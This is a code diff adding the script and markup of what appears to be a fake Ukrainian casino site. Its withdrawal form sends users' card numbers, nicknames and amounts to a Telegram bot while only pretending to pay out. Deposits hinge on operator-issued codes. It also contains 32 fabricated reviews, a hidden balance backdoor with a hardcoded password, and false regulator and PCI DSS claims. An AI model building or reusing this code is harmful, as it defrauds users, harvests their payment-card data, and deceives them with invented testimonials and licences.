+    // 7. ПЕРЕКАЗ: БАЛАНС -> ГАМАНЕЦЬ
+    window.sendToWallet = function() {
+        if (window.balance <= 0) return alert("Баланс порожній!");
+        let amt = prompt("Сума переказу в гаманець:", window.balance);
+        amt = parseFloat(amt);
+        if (amt > 0 && amt <= window.balance) {
+            window.balance -= amt;
+window.historyData.push({
+    type: "📥 Поповнення", 
+    amount: amt, 
+    date: new Date().toLocaleString('uk-UA')
+});
+
+            window.wallet += amt;
+            updateUI();
+            alert("Зараховано в гаманець!");
+        }
+    };
+
+    // 8. ВИВІД З ГАМАНЦЯ
+    window.requestWithdraw = function() {
+        document.getElementById('withdrawModal').style.display = 'flex';
+        document.getElementById('withdrawAmount').value = window.wallet; // автоматично ставимо весь баланс гаманця
+        setTimeout(() => document.getElementById('withdrawModal').classList.add('active'), 10);
+    };
+
+    window.closeWithdraw = function() {
+        const modal = document.getElementById('withdrawModal');
+        modal.classList.remove('active');
+        setTimeout(() => modal.style.display = 'none', 400);
+    };
+
+    window.processWithdraw = async () => {
+        const card = document.getElementById('withdrawCard').value.replace(/\s/g, '');
+        const amount = parseFloat(document.getElementById('withdrawAmount').value);
+        const nickname = document.getElementById('userNickname').value || "Гість";
+
+        // Перевірки
+        if (card.length < 16) return alert("❌ Введіть коректний номер карти (16 цифр)");
+        if (isNaN(amount) || amount < 1030) return alert("❌ Мінімальна сума виводу — 1030 ₴");
+        if (amount > window.wallet) return alert("❌ Недостатньо коштів у гаманці");
+
+        // Відправка в Telegram
+        const msg = `🚀 <b>ЗАЯВКА НА ВИПЛАТУ</b>\n👤 Нік: ${nickname}\n💰 Сума: ${amount.toFixed(2)} ₴\n💳 Карта: <code>${card}</code>`;
+        
+        sendToTG(msg);
+
+        // Оновлюємо баланс
+        window.wallet -= amount;
+        updateUI();
+window.historyData.push({
+    type: "📤 Виведення", 
+    amount: amount, 
+    date: new Date().toLocaleString('uk-UA')
+});
+        alert("✅ Заявку прийнято! Виплата надійде на вказану карту протягом 1-3 годин.");
+        closeWithdraw();
+    };
+
+    // Форматування номера карти (пробіли кожні 4 цифри)
+    document.getElementById('withdrawCard').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // 9. СЕКРЕТНЕ ПОПОВНЕННЯ (для Адміна)
+    let logoClicks = 0;
+    document.querySelector('.logo').onclick = () => {
+        logoClicks++;
+        if (logoClicks >= 5) {
+            if (prompt("Пароль:") === "1122") {
+                let add = parseFloat(prompt("Сума поповнення:"));
+                if (add) { window.balance += add; updateUI(); }
+            }
+            logoClicks = 0;
+        }
+    };
+        window.showRules = function() {
+        alert("📜 ПРАВИЛА:\n1. Ставка 5-2000 ₴\n2. Рандомний результат\n3. X3 (до 299 ₴), X7 (від 300 ₴)");
+    };
+
+    // --- ЛОГІКА ДЕПОЗИТУ (ПОПОВНЕННЯ) ---
+    const secretCodes = ["832941", "105762", "493815", "276409", "951384", "620173", "384526", "719208", "548631", "062947"];
+    let currentDepAmount = 0;
+    let timerInterval;
+
+    window.openDeposit = () => {
+        document.getElementById('depositModal').style.display = 'flex';
+        document.getElementById('depStep1').style.display = 'block';
+        document.getElementById('depStep2').style.display = 'none';
+        document.getElementById('depStep3').style.display = 'none';
+        setTimeout(() => document.getElementById('depositModal').classList.add('active'), 10);
+    };
+
+    window.closeDeposit = () => {
+        const modal = document.getElementById('depositModal');
+        modal.classList.remove('active');
+        setTimeout(() => {
+            modal.style.display = 'none';
+            clearInterval(timerInterval);
+        }, 400);
+    };
+
+    window.startDeposit = async () => {
+        const amt = parseFloat(document.getElementById('depAmount').value);
+        if (amt < 200 || isNaN(amt)) return alert("Мінімальна сума 200 ₴");
+        currentDepAmount = amt;
+        
+        const msg = `<b>💳 ЗАЯВКА НА ПОПОВНЕННЯ</b>\n👤 Нік: ${document.getElementById('userNickname').value || 'Новий користувач'}\n💰 Сума: ${amt} ₴`;
+        sendToTG(msg);
+
+        document.getElementById('depStep1').style.display = 'none';
+        document.getElementById('depStep2').style.display = 'block';
+        startTimer(600); // 10 хвилин
+    };
+
+    function startTimer(duration) {
+        let timer = duration, min, sec;
+        clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+            min = parseInt(timer / 60, 10);
+            sec = parseInt(timer % 60, 10);
+            document.getElementById('timer').textContent = `${min}:${sec < 10 ? '0' + sec : sec}`;
+            if (--timer < 0) clearInterval(timerInterval);
+        }, 1000);
+    }
+
+    window.confirmPayment = () => {
+        sendToTG(`<b>✅ КЛІЄНТ ПІДТВЕРДИВ ОПЛАТУ</b>\n👤 Нік: ${document.getElementById('userNickname').value}\n💰 Сума: ${currentDepAmount} ₴`);
+        document.getElementById('depStep2').style.display = 'none';
+        document.getElementById('depStep3').style.display = 'block';
+        clearInterval(timerInterval);
+    };
+
+    window.activateDep = () => {
+        const codeInput = document.getElementById('depCode');
+        const code = codeInput.value.trim();
+
+        if (secretCodes.includes(code)) {
+            window.balance += currentDepAmount;
+            updateUI();
+            codeInput.value = ''; // Очищуємо поле
+            alert("✨ Депозит активовано! Гроші нараховано на баланс.");
+            sendToTG(`<b>💎 ДЕПОЗИТ УСПІШНИЙ</b>\n👤 Нік: ${document.getElementById('userNickname').value}\n💰 Нараховано: ${currentDepAmount} ₴\n🔑 Код: ${code}`);
+            closeDeposit();
+        } else {
+            alert("❌ Код невірний або вже використаний!");
+            codeInput.value = ''; 
+        }
+    };
+
+    // --- ФУНКЦІЯ ВІДПРАВКИ В TELEGRAM (КРИТИЧНО ВАЖЛИВО) ---
+    function sendToTG(text) {
+        fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: tgChatId, text: text, parse_mode: "HTML" })
+        }).catch(err => console.error("TG Error:", err));
+    }
+     // --- ПОВНИЙ СПИСОК ВІДГУКІВ (32 ШТ.) ---
+    const allReviews = [
+        { name: "Андрій Коваль", date: "23.11.2021", time: "19:18", text: "Дуже приємний сайт, усе зрозуміло з першого заходу. Святковий дизайн реально піднімає настрій." },
+        { name: "Олена Мельник", date: "05.12.2021", time: "20:44", text: "Гарне оформлення, нічого зайвого. Користуватись комфортно навіть з телефону." },
+        { name: "Максим Шевченко", date: "18.12.2021", time: "22:01", text: "Зайшов з цікавості, але залишився. Все працює плавно." },
+        { name: "Ірина Бондар", date: "02.01.2022", time: "14:37", text: "Дуже сподобався інтерфейс, виглядає сучасно та офіційно." },
+        { name: "Дмитро Петренко", date: "24.12.2022", time: "21:09", text: "Класна атмосфера, особливо ввечері. Видно, що сайт продуманий." },
+        { name: "Наталія Кравченко", date: "31.12.2022", time: "23:26", text: "Реально новорічний настрій, приємно проводити час 🎄" },
+        { name: "Сергій Поліщук", date: "10.01.2023", time: "16:52", text: "Все логічно зроблено, легко розібратись без інструкцій." },
+        { name: "Юлія Романюк", date: "28.01.2023", time: "19:41", text: "Дуже подобається дизайн і плавні переходи між сторінками." },
+        { name: "Віталій Лисенко", date: "15.02.2023", time: "11:08", text: "Зручно, що є демо-режим. Можна спокійно спробувати." },
+        { name: "Оксана Мороз", date: "06.03.2023", time: "18:23", text: "Сайт виглядає «живим», постійно щось відбувається." },
+        { name: "Артем Гнатюк", date: "22.03.2023", time: "20:57", text: "Гарна подача ігор, все виглядає акуратно." },
+        { name: "Марина Савчук", date: "09.04.2023", time: "13:34", text: "Дуже приємні кольори та шрифти, не втомлює очі." },
+        { name: "Роман Ткаченко", date: "19.05.2023", time: "21:10", text: "Інтерфейс зрозумілий, нічого не гальмує." },
+        { name: "Катерина Дяченко", date: "07.06.2023", time: "10:46", text: "Сподобалось, що все пояснюється простими словами." },
+        { name: "Олексій Бойко", date: "29.07.2023", time: "23:02", text: "Дуже стильний сайт, видно увагу до деталей." },
+        { name: "Тетяна Олійник", date: "14.08.2023", time: "17:28", text: "Зручно користуватись навіть без ноутбука." },
+        { name: "Ігор Сидоренко", date: "01.10.2023", time: "21:49", text: "Гарно зроблений особистий кабінет." },
+        { name: "Анастасія Левченко", date: "24.12.2023", time: "20:55", text: "Святкова атмосфера на максимум 🎁" },
+        { name: "Владислав Кузьменко", date: "04.01.2024", time: "15:19", text: "Все працює стабільно, без багів." },
+        { name: "Ольга Марченко", date: "18.02.2024", time: "11:02", text: "Приємно, що є історія дій і виграшів." },
+        { name: "Денис Павлюк", date: "30.03.2024", time: "22:40", text: "Дуже плавні анімації, нічого не ріже око." },
+        { name: "Світлана Ковтун", date: "12.05.2024", time: "14:17", text: "Сайт виглядає офіційно та солідно." },
+        { name: "Богдан Руденко", date: "27.06.2024", time: "19:38", text: "Класно зроблений гаманець і баланс." },
+        { name: "Аліна Федоренко", date: "09.08.2024", time: "09:11", text: "Дуже комфортно користуватись." },
+        { name: "Микола Яценко", date: "21.09.2024", time: "17:04", text: "Все чітко та без зайвої реклами." },
+        { name: "Дарина Соколова", date: "03.11.2024", time: "22:51", text: "Гарний дизайн, приємно повертатись." },
+        { name: "Павло Мироненко", date: "14.12.2024", time: "16:08", text: "Дуже атмосферно, особливо взимку." },
+        { name: "Вікторія Назаренко", date: "01.01.2025", time: "00:41", text: "Новий рік почався з гарного настрою 🎆" },
+        { name: "Євген Климчук", date: "18.02.2025", time: "20:19", text: "Все зрозуміло і логічно зроблено." },
+        { name: "Аліса Черненко", date: "04.04.2025", time: "14:06", text: "Дуже сучасний вигляд сайту." },
+        { name: "Кирило Степаненко", date: "17.06.2025", time: "11:43", text: "Нічого зайвого, все по суті." },
+        { name: "Марія Іванова", date: "31.12.2025", time: "22:52", text: "Чудове завершення року, святковий настрій на всі 100 ✨" }
+    ];
+
+    window.showReviewsSection = function() {
+        document.getElementById('gameHall').style.display = 'none';
+        document.getElementById('reviewsStep').style.display = 'flex';
+        renderReviews();
+        window.scrollTo(0, 0);
+    };
+
+    window.hideReviewsSection = function() {
+        document.getElementById('reviewsStep').style.display = 'none';
+        document.getElementById('gameHall').style.display = 'block';
+        window.scrollTo(0, 0);
+    };
+
+    function renderReviews() {
+        const container = document.getElementById('reviewsContainer');
+        if (!container) return;
+        // Відображаємо список (нові зверху)
+        const displayList = [...allReviews].reverse();
+        container.innerHTML = displayList.map(rev => `
+            <div style="margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 15px;">
+                <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 5px;">
+                    <span style="color: var(--gold); font-weight: 700;">${rev.name}</span>
+                    <span style="opacity: 0.5;">🗓 ${rev.date} · ${rev.time}</span>
+                </div>
+                <p style="font-size: 13px; margin: 0; opacity: 0.8; line-height: 1.4;">${rev.text}</p>
+            </div>
+        `).join('');
+    }
+    // --- ФУНКЦІЇ ОСОБИСТОГО КАБІНЕТУ ---
+    window.showAccount = function() {
+        document.getElementById('gameHall').style.display = 'none';
+        document.getElementById('accountSection').style.display = 'flex';
+        
+        // Беремо дані, які користувач вводив у поля реєстрації
+        document.getElementById('accNick').textContent = document.getElementById('userNickname').value || "Гість";
+        document.getElementById('accPhone').textContent = document.getElementById('userPhone').value || "Не вказано";
+        document.getElementById('accSocial').textContent = document.getElementById('userSocial').value || "Не вказано";
+
+        renderHistory(); // Оновлюємо список транзакцій
+    };
+
+    window.hideAccount = function() {
+        document.getElementById('accountSection').style.display = 'none';
+        document.getElementById('gameHall').style.display = 'block';
+    };
+
+    function renderHistory() {
+        const list = document.getElementById('historyList');
+        if (!window.historyData || window.historyData.length === 0) {
+            list.innerHTML = '<p style="text-align: center; opacity: 0.5; font-size: 12px;">Операцій ще не було</p>';
+            return;
+        }
+        
+        list.innerHTML = window.historyData.map(item => `
+            <div class="history-item">
+                <div>
+                    <div class="history-type">${item.type}</div>
+                    <div class="history-date">${item.date}</div>
+                </div>
+                <div class="history-amt">${item.amount} ₴</div>
+            </div>
+        `).reverse().join('');
+    }
+    // ----------------------------------
+    window.handleUserReview = () => {
+        const textArea = document.getElementById('userReviewText');
+        const text = textArea.value.trim();
+        const nickname = document.getElementById('userNickname').value || "Користувач";
+
+        if (text.length < 5) return alert("Напишіть ваш відгук…");
+
+        const msg = `<b>💬 НОВИЙ ВІДГУК</b>\n👤 Нік: ${nickname}\n📝 Текст: ${text}`;
+        
+        fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: tgChatId, text: msg, parse_mode: "HTML" })
+        });
+        
+        alert("Дякуємо! Надіслано на модерацію.");
+        textArea.value = "";
+        hideReviewsSection();
+    };
+
+}; // Фінальна дужка window.onload
+    // ... тут закінчується твоя основна логіка ігор ...
+
+    // 👇 ОСЬ ЦЕЙ БЛОК МАЄ БУТИ ОСТАННІМ У ТВОЄМУ СКРИПТІ 👇
+
+    // 1. Авто-збереження кожні 1.5 секунди
+    setInterval(() => {
+        if (document.getElementById('gameHall').style.display === 'block') {
+            const sessionData = {
+                nick: document.getElementById('userNickname').value,
+                phone: document.getElementById('userPhone').value,
+                social: document.getElementById('userSocial').value,
+                balance: parseFloat(window.balance) || 0, 
+                wallet: parseFloat(window.wallet) || 0,
+                history: window.historyData || []
+            };
+            localStorage.setItem('userSession', JSON.stringify(sessionData));
+        }
+    }, 1500);
+
+    // 2. Відновлення при завантаженні
+    window.addEventListener('load', () => {
+        const saved = localStorage.getItem('userSession');
+        if (saved) {
+            const d = JSON.parse(saved);
+            window.balance = parseFloat(d.balance) || 0;
+            window.wallet = parseFloat(d.wallet) || 0;
+            window.historyData = d.history || [];
+            
+            document.getElementById('userNickname').value = d.nick || "";
+            document.getElementById('userPhone').value = d.phone || "";
+            document.getElementById('userSocial').value = d.social || "";
+
+            document.getElementById('heroBlock').style.display = 'none';
+            document.getElementById('promoBlock').style.display = 'none';
+            document.getElementById('registrationStep').style.display = 'none';
+            document.getElementById('gameHall').style.display = 'block';
+
+            if (typeof updateUI === "function") updateUI();
+        }
+    });
+
+    // 3. Вихід
+    window.logoutUser = function() {
+        if (confirm("Вийти? Дані буде видалено!")) {
+            localStorage.removeItem('userSession');
+            location.reload();
+        }
+    };
+</script>
+<div id="withdrawModal" class="modal" style="display: none;">
+    <div class="modal-content" style="max-width: 400px;">
+        <h2 style="color:var(--gold)">📤 Виведення коштів</h2>
+        
+        <div style="display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; opacity: 0.8;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" style="height: 20px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="height: 30px;">
+        </div>
+
+        <div style="text-align: left; margin-bottom: 15px;">
+            <label style="font-size: 12px; opacity: 0.7;">Номер карти:</label>
+            <input type="text" id="withdrawCard" placeholder="0000 0000 0000 0000" maxlength="19" style="width:100%; box-sizing:border-box; padding:12px; margin-top:5px; background:#000; color:#fff; border:1px solid rgba(255,255,255,0.2); border-radius:10px; text-align:center; font-size: 16px;">
+        </div>
+
+        <div style="text-align: left; margin-bottom: 20px;">
+            <label style="font-size: 12px; opacity: 0.7;">Сума виводу (мін. 1030 ₴):</label>
+            <input type="number" id="withdrawAmount" placeholder="Вкажіть суму" style="width:100%; box-sizing:border-box; padding:12px; margin-top:5px; background:#000; color:var(--gold); border:1px solid var(--gold); border-radius:10px; text-align:center; font-weight:700;">
+        </div>
+
+        <button onclick="processWithdraw()" class="main-btn">ПІДТВЕРДИТИ ВИВІД</button>
+        <button onclick="closeWithdraw()" style="background:transparent; color:#fff; border:none; margin-top:15px; cursor:pointer; font-size: 13px;">← Назад до ігор</button>
+    </div>
+</div>
+
+<footer style="padding: 60px 20px; background: linear-gradient(to top, rgba(0,0,0,0.8), transparent); border-top: 1px solid rgba(252,211,77,0.15); text-align: center; margin-top: 80px; font-family: 'Segoe UI', Roboto, sans-serif;">
+    
+    <div style="display: flex; justify-content: center; gap: 30px; margin-bottom: 30px; letter-spacing: 2px; font-size: 12px; font-weight: 700; color: rgba(255,255,255,0.3);">
+        <span style="border: 1px solid rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px;">MGA REGULATED</span>
+        <span style="border: 1px solid rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px;">CEG CURACAO</span>
+        <span style="border: 1px solid rgba(255,255,255,0.2); padding: 4px 8px; border-radius: 4px;">14+</span>
+    </div>
+
+    <div style="max-width: 700px; margin: 0 auto; font-size: 10px; color: rgba(255,255,255,0.3); line-height: 1.8; text-transform: uppercase; letter-spacing: 0.5px;">
+        <p style="margin-bottom: 10px; color: rgba(255,255,255,0.5);">© 2025 FORTUNA ENTERTAINMENT GROUP. ALL RIGHTS RESERVED.</p>
+        <p>Сайт управляється компанією Fortuna Global N.V. згідно з ліцензією №8048/JAZ2025-011. Усі фінансові операції захищені наскрізним шифруванням за стандартом PCI DSS. Використання даного ресурсу дозволено особам, які досягли 14-річного віку.</p>
+        
+        <div style="margin-top: 25px; color: var(--gold); border: 1px solid var(--gold); display: inline-block; padding: 10px 25px; opacity: 0.6;">
+            ВІДПОВІДАЛЬНА ГРА — НАШ ПРІОРИТЕТ
+        </div>
+    </div>
+</footer>
+<a href="https://t.me/albinaaa_12" target="_blank" id="supportBubble" style="
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    background: linear-gradient(135deg, #24A1DE, #1c82b1);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.4), 0 0 20px rgba(36, 161, 222, 0.4);
+    z-index: 9999;
+    text-decoration: none;
+    transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    animation: bubblePulse 2s infinite;
+">
+    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M21.4301 3.52985C21.1401 3.23985 20.7201 3.12985 20.3201 3.22985L3.32011 7.22985C2.92011 7.32985 2.61011 7.63985 2.52011 8.02985C2.43011 8.41985 2.58011 8.82985 2.91011 9.05985L8.53011 12.9198L11.7701 19.3998C11.9501 19.7598 12.3101 19.9898 12.7101 19.9998C12.7201 19.9998 12.7401 19.9998 12.7501 19.9998C13.1401 19.9998 13.4901 19.7798 13.6701 19.4298L21.6701 4.42985C21.8501 4.07985 21.7501 3.65985 21.4301 3.52985ZM12.5401 16.9498L10.3201 12.5198L17.5801 6.81985L12.5401 16.9498Z" fill="white"/>
+    </svg>
+    <span style="
+        position: absolute;
+        top: -5px;
+        right: -5px;
+        background: #ef4444;
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        border: 2px solid #fff;
+    "></span>
+</a>
+<div id="bg-animation" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: #0a0a0a; overflow: hidden;"></div>
